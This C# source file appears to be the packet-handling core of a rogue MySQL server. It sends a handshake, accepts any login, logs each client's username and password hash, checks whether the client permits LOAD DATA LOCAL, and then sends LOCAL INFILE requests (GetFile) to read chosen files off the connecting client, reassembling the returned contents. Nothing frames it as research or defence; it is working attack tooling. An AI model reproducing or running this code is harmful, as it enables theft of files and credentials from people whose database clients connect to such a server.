﻿using MysqlT.App;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Mysql.MysqlData
{
    public class MysqlGainData
    {
        public static byte[] GetFile(string file)
        {
            if (file.Length == 0) { return new byte[1]; };
            if (file[file.Length - 1] == '\r') { file = file.Remove(file.Length - 1); }
            List<byte> t = new List<byte>();
            t.AddRange(BitConverter.GetBytes((file.Length + 1)));
            t.RemoveAt(3);
            t.Add(0x01);
            t.Add(0xfb);
            t.AddRange(Encoding.Default.GetBytes(file));
            return t.ToArray();
        }

        public static void TransformationFileData(ref byte[] data)
        {
            if (data.Length == 4)
            {
                data = Encoding.Default.GetBytes("NULL");
            }
            else
            {
                byte[] b_packet_length = { 0x00, 0x00, 0x00, 0x00 };  //int 4个字节 mysql 3个 补一个
                Array.Copy(data, 0, b_packet_length, 0, 3);
                List<byte> t = new List<byte>();
                t.AddRange(data);
                int pacet_length = BitConverter.ToInt32(b_packet_length, 0);
                {
                    int j = (int)Math.Floor((double)((t.Count - 4) / (pacet_length + 4)));
                    for (int i = 0; i < j; i++)
                    {
                        int f = i * pacet_length;
                        t.RemoveRange(f, 4);
                    }
                    if (j * pacet_length == t.Count - 4)
                    {
                        t.RemoveRange(t.Count - 4, 4);

                    }
                    else
                    {

                        t.RemoveRange(t.Count - 4, 4);
                        t.RemoveRange(j * pacet_length, 4);
                    }
                }
                data = t.ToArray();
                t = null;
            }
        }
        public static void TransformationFileData(ref List<byte> data)
        {
            if (data.Count == 4)
            {
                data.Clear();
                data.AddRange(Encoding.Default.GetBytes("NULL"));
            }
            else
            {
                byte[] b_packet_length = { 0x00, 0x00, 0x00, 0x00 };  //int 4个字节 mysql 3个 补一个
                b_packet_length[0] = data[0];
                b_packet_length[1] = data[1];
                b_packet_length[2] = data[2];
                int pacet_length = BitConverter.ToInt32(b_packet_length, 0);
                {
                    int j = (int)Math.Floor((double)((data.Count - 4) / (pacet_length + 4)));
                    for (int i = 0; i < j; i++)
                    {
                        int f = i * pacet_length;
                        data.RemoveRange(f, 4);
                    }
                    if (j * pacet_length == data.Count - 4)
                    {
                        data.RemoveRange(data.Count - 4, 4);

                    }
                    else
                    {

                        data.RemoveRange(data.Count - 4, 4);
                        data.RemoveRange(j * pacet_length, 4);
                    }
                }
            }
        }
        public static void TransformationLoginData(byte[] data, UserInfo ui)
        {
            ArrayT<byte> t = new ArrayT<byte>();
            int[] _t = { };
            t.AddRange(data);
            byte[] t_data = { 0x00, 0x00 };
            Array.Copy(t.value, 5 - 1, t_data, 0, 2);
            short value = BitConverter.ToInt16(t_data, 0);
            char v = Convert.ToString(value, 2).Reverse<char>().ToArray()[8 - 1];
            if (v == '1')   //判断是否支持Can Use LOAD DATA LOCAL   0是不支持,1是支持
            {
                ui.LoadData = true;
            }
            else
            {

                ui.LoadData = false;
            }
            t.RemoveRange(0, 36);
            _t = t.ArraySeachint(0x00);
            byte[] username = t.Get(0, _t[0]);
            ui.username = (Encoding.Default.GetString(username));
            byte[] password = null;
            byte[] info = null;
            //PassWord
            if (t.Get(_t[0] + 1) == 0x14)
            {
                password = t.Get(_t[0] + 2, 20);
                foreach (var item in password)
                {
                    string _titem = Convert.ToString(item, 16);
                    _titem = _titem.Length == 1 ? "0" + _titem : _titem;
                    ui.password += _titem;
                }

            }
            else
            {

                ui.password = "NULL";
            }
            //Info
            if (ui.username.Length + 2 == t.Count() || ui.username.Length + 22 == t.Count() || ui.username.Length + 23 == t.Count())
            {
                ui.info = "NULL";
            }
            else if (password == null)
            {
                ui.info = Encoding.Default.GetString(t.Get(_t[1], _t[2] - _t[1]));
            }
            else
            {

                ui.info = Encoding.Default.GetString(t.Get(_t[0] + 22, _t[_t.Length - 1] - (_t[0] + 21)));
            }
            t = null;
        }
        public static byte[] TransformationData(byte[] data)
        {
            byte[] t_data = new byte[(data.Count() - 5)]; //5 包内容长度(3)+包次数(1)+查询次数(1)   应该是这样
            Array.Copy(data, 5, t_data, 0, t_data.Count());//同上
            return t_data;
        }
        public static byte[] GetHello(string Version, int ThreadId, string Salt)
        {
            List<byte> data = new List<byte>();
            int len = 78 - 10 + Version.Length;//包内容长度
            data.AddRange(BitConverter.GetBytes(len));//包内容长度转byte字节
            data.RemoveAt(3);//因为int在内存中占4个字节,而mysql这个占3个,所以我们要去掉一位
            data.Add(0x00);//执行次数
            data.Add(BitConverter.GetBytes(Version.Length)[0]);//版本所占长度
            data.AddRange(Encoding.Default.GetBytes(Version));//版本信息
            data.Add(0x00);
            data.AddRange(BitConverter.GetBytes(ThreadId));  //线程ID
            data.AddRange(Encoding.Default.GetBytes(Salt.Substring(0, 8)));//8位密钥
            data.AddRange(new byte[] { 0x00, 0xff, 0xf7, 0x08, 0x02, 0x00, 0x0f, 0x80, 0x15, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 });
            data.AddRange(Encoding.Default.GetBytes(Salt.Substring(8, 12)));//12位密钥
            data.AddRange(new byte[] { 0x00, 0x6d, 0x79, 0x73, 0x71, 0x6c, 0x5f, 0x6e, 0x61, 0x74, 0x69, 0x76, 0x65, 0x5f, 0x70, 0x61, 0x73, 0x73, 0x77, 0x6f, 0x72, 0x64, 0x00 });
            return data.ToArray();
        }
        public static byte[] GetLoginOk()
        {
            byte[] data = { 0x07, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00 };//登陆成功的包没什么可控的
            return data;
        }
        public static byte[] GetLoginError(short ErrorCode, string ErrorMessage)
        {
            List<byte> data = new List<byte>();
            int len = 7 + 2 + ErrorMessage.Length;
            byte[] t_data = { 0x32, 0x38, 0x30, 0x30, 0x30 };//SQL state 28000
            data.AddRange(BitConverter.GetBytes(len));
            data.RemoveAt(3);
            data.Add(0x02);
            data.Add(0xff);
            data.AddRange(BitConverter.GetBytes(ErrorCode));
            data.Add(0x23);
            data.AddRange(t_data);
            data.AddRange(Encoding.UTF8.GetBytes(ErrorMessage));
            return data.ToArray();
        }
        public static byte[] GetQueryError(short ErrorCode, string ErrorMessage)
        {
            List<byte> data = new List<byte>();
            int len = 7 + 2 + ErrorMessage.Length;
            byte[] t_data = { 0x34, 0x32, 0x53, 0x32, 0x32 };
            data.AddRange(BitConverter.GetBytes(len));
            data.RemoveAt(3);
            data.Add(0x01);
            data.Add(0xff);
            data.AddRange(BitConverter.GetBytes(ErrorCode));
            data.Add(0x23);
            data.AddRange(t_data);
            data.AddRange(Encoding.Default.GetBytes(ErrorMessage));
            return data.ToArray();
        }
        public static byte[] GetQueryOk()
        {
            byte[] data = { 0x07, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00, 0x02, 0x00, 0x00, 0x00 };
            return data;
        }
        public static bool IsLoadData(byte[] data)
        {

            byte[] t_data = { 0x00, 0x00 };
            Array.Copy(data, 5 - 1, t_data, 0, 2);
            short value = BitConverter.ToInt16(t_data, 0);
            char v = Convert.ToString(value, 2).Reverse<char>().ToArray()[8 - 1];
            if (v == '1')   //判断是否支持Can Use LOAD DATA LOCAL   0是不支持,1是支持
            {
                return true;
            }
            else
            {

                return false;
            }
        }
        public static bool IsFileData(ref byte[] data)
        {
            byte[] t_data = new byte[4];
            byte[] ConfirmData = { 0x00, 0x00, 0x00, 0x03 };
            //  int a = BitConverter.ToInt32(data, data.Length - 4);
            Array.Copy(data, data.Length - 4, t_data, 0, 4);
            if (t_data[0] == ConfirmData[0] && t_data[1] == ConfirmData[1] && t_data[2] == ConfirmData[2] && t_data[3] != 0x00 && data.Length > 5 || data.Length == 4)
            {

                return true;
            }
            else
            {

                return false;
            }
        }


    }
}
